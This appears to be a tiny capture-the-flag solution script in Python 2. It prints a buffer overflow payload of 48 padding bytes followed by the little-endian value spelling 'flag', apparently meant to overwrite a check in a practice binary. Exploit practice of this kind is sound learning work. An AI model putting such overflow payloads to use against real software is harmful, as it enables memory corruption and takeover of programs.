import struct

BUFF = 48
payload = ("A" * BUFF) + struct.pack("<I", 0x67616c66) # Target

print payload
